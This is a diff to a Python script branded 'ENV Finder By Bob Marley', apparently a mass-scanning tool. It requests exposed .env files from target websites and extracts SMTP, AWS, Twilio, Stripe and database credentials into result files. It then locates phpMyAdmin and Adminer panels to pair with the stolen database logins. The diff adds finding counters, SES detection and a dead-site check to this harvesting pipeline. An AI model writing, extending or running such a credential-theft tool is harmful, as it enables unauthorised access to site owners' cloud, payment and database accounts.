@@ -11,7 +11,7 @@ LIME = Fore.LIGHTGREEN_EX
 banner = f"""{LIME}{Style.BRIGHT}
 ╔════════════════════════════════════════════════════════╗
 ║                                                        ║
-║              ENV Finder By Bob Marley      	         ║
+║              ENV Finder By Bob Marley                  ║
 ║                                                        ║
 ╚════════════════════════════════════════════════════════╝
 {Style.RESET_ALL}"""
@@ -40,12 +40,37 @@ found_phpmyadmin = set()
 found_adminer = set()
 db_creds_dict = {}  # {site_base: (host, user, pass, name)}
 
+# Counter for findings
+findings = {
+    "ENV": 0,
+    "PMA": 0,
+    "ADM": 0,
+    "SES": 0,
+    "DB": 0,
+    "SMTP": 0,
+    "STRIPE": 0,
+    "TWILLIO": 0
+}
+
+def print_findings():
+    print(
+        f"{Fore.LIGHTMAGENTA_EX}"
+        f"ENV : {findings['ENV']}  "
+        f"PMA : {findings['PMA']}  "
+        f"ADM : {findings['ADM']}  "
+        f"SES : {findings['SES']}  "
+        f"DB : {findings['DB']}  "
+        f"SMTP : {findings['SMTP']}  "
+        f"STRIPE : {findings['STRIPE']}  "
+        f"TWILLIO : {findings['TWILLIO']}"
+        f"{Style.RESET_ALL}"
+    )
+    
 def safe_find(pattern, text):
     m = re.search(pattern, text, re.MULTILINE)
     return m.group(1).strip() if m else ''
 
 def is_env_file(text):
-    # Check for at least one of these common .env keys
     return any(key in text for key in ["DB_HOST", "DB_USERNAME", "MAIL_HOST", "APP_KEY", "APP_ENV"])
 
 def grab_smtp(url, text):
@@ -76,6 +101,8 @@ def grab_smtp(url, text):
             filename = 'SMTP_RANDOM.txt'
         with open(f'Results/{filename}', 'a', encoding='utf-8') as f:
             f.write(build + '\n\n')
+        findings["SMTP"] += 1
+        print_findings()
         return True
     return False
 
@@ -87,6 +114,10 @@ def grab_aws(url, text):
         build = f'URL: {url}\nAWS_ACCESS_KEY_ID: {aws_key}\nAWS_SECRET_ACCESS_KEY: {aws_secret}\nAWS_DEFAULT_REGION: {aws_region}'
         with open('Results/aws.txt', 'a', encoding='utf-8') as f:
             f.write(build + '\n\n')
+        # SES detection: region contains 'ses' or key starts with 'ASIA' (common for SES)
+        if (aws_region and 'ses' in aws_region.lower()) or (aws_key and aws_key.startswith('ASIA')):
+            findings["SES"] += 1
+            print_findings()
         return True
     return False
 
@@ -99,6 +130,8 @@ def grab_twilio(url, text):
         build = f'URL: {url}\nTWILIO_ACCOUNT_SID: {sid}\nTWILIO_AUTH_TOKEN: {token}\nTWILIO_API_KEY: {api_key}\nTWILIO_API_SECRET: {api_secret}'
         with open('Results/twilio.txt', 'a', encoding='utf-8') as f:
             f.write(build + '\n\n')
+        findings["TWILLIO"] += 1
+        print_findings()
         return True
     return False
 
@@ -109,6 +142,8 @@ def grab_stripe(url, text):
         build = f'URL: {url}\nSTRIPE_KEY: {stripe_key}\nSTRIPE_SECRET: {stripe_secret}'
         with open('Results/stripe.txt', 'a', encoding='utf-8') as f:
             f.write(build + '\n\n')
+        findings["STRIPE"] += 1
+        print_findings()
         return True
     return False
 
@@ -125,6 +160,8 @@ def grab_db(site_base, url, text):
         build = f'URL: {url}\nDB_CONNECTION: {db_conn}\nDB_HOST: {db_host}\nDB_PORT: {db_port}\nDB_DATABASE: {db_name}\nDB_USERNAME: {db_user}\nDB_PASSWORD: {db_pass}'
         with open('Results/Database.txt', 'a', encoding='utf-8') as f:
             f.write(build + '\n\n')
+        findings["DB"] += 1
+        print_findings()
         return creds_tuple
     return None
 
@@ -149,7 +186,7 @@ def format_adminer(url, creds):
 def check_phpmyadmin(site_base):
     creds = db_creds_dict.get(site_base)
     if not creds:
-        return  # Only proceed if DB creds exist
+        return
     for pma_path in phpmyadmin_paths:
         url = site_base.rstrip('/') + pma_path
         try:
@@ -160,6 +197,8 @@ def check_phpmyadmin(site_base):
                     print(f"{Fore.LIGHTGREEN_EX}[phpMyAdmin FOUND] {url}{Style.RESET_ALL}")
                     with open('Results/phpmyadmin.txt', 'a', encoding='utf-8') as f:
                         f.write(format_phpmyadmin(url, creds))
+                    findings["PMA"] += 1
+                    print_findings()
                 break
         except Exception:
             continue
@@ -167,7 +206,7 @@ def check_phpmyadmin(site_base):
 def check_adminer(site_base):
     creds = db_creds_dict.get(site_base)
     if not creds:
-        return  # Only proceed if DB creds exist
+        return
     for adm_path in adminer_paths:
         url = site_base.rstrip('/') + adm_path
         try:
@@ -178,6 +217,8 @@ def check_adminer(site_base):
                     print(f"{Fore.LIGHTGREEN_EX}[Adminer FOUND] {url}{Style.RESET_ALL}")
                     with open('Results/adminer.txt', 'a', encoding='utf-8') as f:
                         f.write(format_adminer(url, creds))
+                    findings["ADM"] += 1
+                    print_findings()
                 break
         except Exception:
             continue
@@ -186,12 +227,28 @@ def get_site_base(site):
     m = re.match(r'(https?://[^/]+)', site)
     return m.group(1) if m else site
 
+def is_site_alive(site_base):
+    try:
+        for test_path in ['', '/robots.txt']:
+            url = site_base.rstrip('/') + test_path
+            resp = requests.get(url, timeout=10)
+            if resp.status_code < 500:
+                return True
+        return False
+    except Exception:
+        return False
+
 def exploit(target):
     if '://' not in target:
         site = 'http://' + target
     else:
         site = target
     site_base = get_site_base(site)
+
+    if not is_site_alive(site_base):
+        print(f"{Fore.LIGHTRED_EX}[DEAD SITE] {site_base} (skipping all .env checks){Style.RESET_ALL}")
+        return
+
     for read_path in path:
         exploit_path = site_base.rstrip('/') + read_path
         try:
@@ -202,6 +259,8 @@ def exploit(target):
                     print(f"{Fore.LIGHTGREEN_EX}[FOUND] {exploit_path}{Style.RESET_ALL}")
                     with open('Results/env.txt', 'a', encoding='utf-8') as f:
                         f.write(exploit_path + '\n')
+                    findings["ENV"] += 1
+                    print_findings()
                     grab_smtp(exploit_path, resp.text)
                     grab_aws(exploit_path, resp.text)
                     grab_twilio(exploit_path, resp.text)
